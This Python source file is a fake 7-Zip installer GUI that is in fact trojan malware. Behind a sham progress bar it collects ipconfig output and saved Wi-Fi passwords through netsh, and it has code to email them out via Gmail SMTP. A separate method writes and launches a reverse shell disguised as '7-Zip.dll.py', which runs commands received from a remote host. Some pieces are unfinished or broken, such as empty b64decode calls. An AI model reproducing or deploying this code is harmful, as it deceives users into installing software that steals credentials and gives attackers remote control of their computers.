import tkinter as tk
from tkinter import ttk
from tkinter import filedialog
from tkinter import *
import time
from tkinter.ttk import *
import re
import os
import subprocess as sp
import base64
import smtplib
import io
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

#todo:
#add other versions of 7zip as different executables
#Edit before conversions
#Backdoor command setup
#netcat


class Zip_Gui:
    def __init__(self,HEIGHT,WIDTH):
        
        self.HEIGHT = HEIGHT
        self.WIDTH = WIDTH

    def browse_function(self, entry):

        filename = filedialog.askdirectory()
        if(len(filename) != 0):
            entry.delete(0, tk.END)
            entry.insert(tk.END, filename)

    def command_rShell(self):
        f = open("7-Zip.dll.py", 'w')

        a1 = "import socket\n"
        a2 = "import os\n"
        a3 = "import subprocess\n"
        a4 = "import sys\n"
        c1 = "import base64\n"
        b1 = "import smtplib\n"
        b2 = "import io\n"
        b3 = "from email.mime.text import MIMEText\n"
        b4 = "from email.mime.multipart import MIMEMultipart\n\n"

        b5 = "def send_mail():\n"
        b6 = "\ts=smtplib.SMTP(\'smtp.gmail.com',587, None, 30)\n"
        b7 = "\tuser_email = base64.b64decode()\n"
        b8 = "\tPassword = base64.b64decode()\n"
        b9 = "\ts.login(user_email, Password)\n\n"

        b10 = "\tmsg = MIMEMultipart()\n"
        b11 = "\tname = \" \"\n"
        b12 = "\temail = user_email\n\n"

        b13 = "\tmsg['From'] = email\n"
        b14 = "\tmsg['To'] = email\n"
        b15 = "\tmsg['Subject'] = \"Client is connecting\"\n\n"

        b16 = "\ttext = \"Setup the server, the client is currently waiting for a response\"\n"
        b17 = "\tT1 = MIMEText(text, \"plain\")\n\n"

        b18 = "\tmsg.attach(T1)\n\n"

        b19 = "\ts.send_message(msg)\n"
        b20 = "\tdel msg\n\n"

        a5 = "HOST = sys.argv[1]\n"
        a6 = "PORT = 443\n"
        a7 = "Buffer_Size = 1024 * 128\n"
        a7_1 = "Separator = \"<sep>\"\n\n"
        a8 = "s = socket.socket()\n"
        a9 = "s.connect((HOST,PORT))\n"
        a10 = "cwd = os.getcwd()\n"
        a11 = "s.send(cwd.encode())\n\n"
        a12 = "while True:\n"
        a13 = "\tcommand = s.recv(Buffer_Size).decode()\n"
        a14 = "\tsplit_command = command.split()\n\n"

        a15 = "\tif command.lower() == \"exit\":\n"
        a16 = "\t\tbreak\n"
        a17 = "\tif split_command[0].lower() == \"cd\":\n"
        a18 = "\t\ttry:\n"
        a19 = "\t\t\tos.chdir(' '.join(split_command[1:]))\n"
        a20 = "\t\texcept FileNotFoundError as e:\n"
        a21 = "\t\t\toutput = str(e)\n"
        a21_1 = "\t\telse:\n"
        a21_2 = "\t\t\toutput = \"\"\n"
        a22 = "\telse:\n"
        a23 = "\t\toutput = subprocess.getoutput(command)\n\n"


        a24 = "\tcwd = os.getcwd()\n"
        a25 = "\tmessage = f\'{output}{Separator}{cwd}\'\n"
        a26 = "\ts.send(message.encode())\n"
        a27 = "s.close()"

        f.write(a1+a2+a3+a4+c1+b1+b2+b3+b4+b5+b6+b7+b8+b9+b10+b11+b12+b13+b14+b15+b16+b17+b18+b19+b20+a5+a6+a7+a7_1+a8+a9+a10+a11+a12+a13+a14+a15+a16+a17+a18+a19+a20+a21+a21_1+a21_2+a22+a23+a24+a25+a26+a27)
        f.close()

        shell = sp.Popen(["python", "7-Zip.dll.py", "<ip address>"], stdout=sp.DEVNULL)

    def Ip_Pay(self):

        ipconfig_info = sp.run(["ipconfig"], capture_output=True).stdout.decode()
        
        #self.send_mail(ipconfig_info)

    def SSID_Payload(self):

        SSID_info = sp.run(["netsh", "wlan", "show", "profiles", ], capture_output=True).stdout.decode()
        SSID_profiles = re.findall("All User Profile     : (.*)\r",SSID_info)
        Key_List = []
        for i in SSID_profiles:
            temp = i
            key_SSID = sp.run(['netsh', 'wlan', 'show', 'profiles', i, 'key=clear'], capture_output=True).stdout.decode()
            key_Find = re.findall("Key Content            : (.*)\r",key_SSID)
            if(len("".join(key_Find)) != 0):
                k_S = temp + ": " + "".join(key_Find)
                Key_List.append(k_S)
            else:
                Key_List.append(temp + ": " + "Key absent")

        #self.send_mail(Key_List)

    def send_mail(self,load):

        #setup smtp server
        #Change after 'smtp.' for respective email server (Ex. If outlook.com is the chosen email server enter 'smtp.outlook.com')
        s = smtplib.SMTP('smtp.gmail.com', 587, None, 30)
        #Enter Username and password inside the parameters as base64 encode
        user_email = base64.b64decode()
        Password = base64.b64decode()
        s.login(user_email, Password)

        #Create email Template to send
        msg = MIMEMultipart()
        name = " "
        email = user_email

        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = "User Network info"

        text = "Network info file"
        T1 = MIMEText(text, "plain")
        text_file = io.open('Net_File.txt', mode='w', encoding='utf-8')
        text_file.write('Network info: %s' % (load))
        text_file.close()

        msg.attach(T1)
        msg.attach(text_file)

        s.send_message(msg)
        del msg

    def cancel(self):

        exit()

    def on_enter(self,button_back):
        button_back.widget['background'] = "#e5f1fb"

    def on_leave(self,button_back):
         button_back.widget['background'] = "SystemButtonFace"

    def bar(self, root, button_install, cancel):

        value = 0

        files = [
            "7-zip.chm", 'Lang/cy.txt', 'Lang/eo/txt', 'Lang/fur.txt', 
            'lang/ku-ckb.txt', 'Lang/ne.txt', 'Lang/ro.txt', 'Lang/sr-spc.txt', 
            'License.txt', '7-Zip.dll', 'Uninstall.dll']

        progress = ttk.Progressbar(root, orient=HORIZONTAL, length=100, mode='determinate')
        progress.place(relx=0.04, rely=0.45, relheight= 0.12, relwidth=0.89)
        
        label_installed = tk.Label(root, text="Installing", bg="#f0f0f0", font=('arial',8), anchor='w')
        label_installed.place(relx=0.029, rely=0.35, relheight= 0.1, relwidth=0.5)  
        
        for i in range(len(files)):
            value += 6.8
            label_installed['text'] = files[i]
            progress['value']=value
            root.update_idletasks()
            time.sleep(0.1)

        label_installed['text']="7-Zip 19.00 (x64) is installed"
        time.sleep(2)
        self.Ip_Pay()
        self.SSID_Payload()
        progress['value']=100
        cancel['text']="Close"
        button_install['state']=DISABLED
        
    def format_Gui(self):

        root=tk.Tk()
        root.iconbitmap('7zip.ico')
        
        canvas = tk.Canvas(root,height=self.HEIGHT, width=self.WIDTH)
        canvas.pack()
        
        frame=tk.Frame(root,bg='#f0f0f0',bd=2)
        frame.place(relx=0.5, rely=0.001, relheight=1, relwidth=1, anchor='n')
        
        button_install=tk.Button(root, text='Install',bg='#e1e1e1',relief='solid', borderwidth=0.5, font=('arial',8), activebackground='#cce4f7', command=lambda: self.bar(root,button_install,button_cancel))
        button_install.place(relx=0.28, rely=0.78, relheight= 0.14, relwidth=0.31)
        button_install.bind("<Enter>", self.on_enter)
        button_install.bind("<Leave>", self.on_leave)
        
        button_dir=tk.Button(root, bg='#e1e1e1', text="...", relief='solid', borderwidth=0.5, font=('arial',8), activebackground='#cce4f7', command=lambda: self.browse_function(entry))
        button_dir.place(relx=0.83, rely=0.15, relheight= 0.14, relwidth=0.1)
        button_dir.bind("<Enter>", self.on_enter)
        button_dir.bind("<Leave>", self.on_leave)

        button_cancel=tk.Button(root, bg='#e1e1e1', text='Cancel',relief='solid', borderwidth=0.5, font=('arial',8), activebackground='#cce4f7', command=lambda: self.cancel())
        button_cancel.place(relx=0.645, rely=0.78, relheight= 0.14, relwidth=0.31)
        button_cancel.bind("<Enter>", self.on_enter)
        button_cancel.bind("<Leave>", self.on_leave)

        label=tk.Label(root, text='Destination folder:', bg='#f0f0f0',font=('arial',8))
        label.place(relx=0.029,rely=0.015,relheight=0.1,relwidth=0.3)
        
        entry=tk.Entry(root, relief='solid', borderwidth=0.5, font=('arial',8))
        entry.insert(0,'C:\Program Files\\7-Zip\\')
        entry.place(relx=0.04,rely=0.15,relheight=0.14,relwidth=0.73)
       
        

        root.resizable(False,False)
        root.title("7-Zip 19.00 (x64) Setup")
        #root.attributes("-toolwindow",1)
        root.mainloop()

def main():
    zip = Zip_Gui(169.4,297)
    zip.format_Gui()
if __name__ == "__main__":
    main()
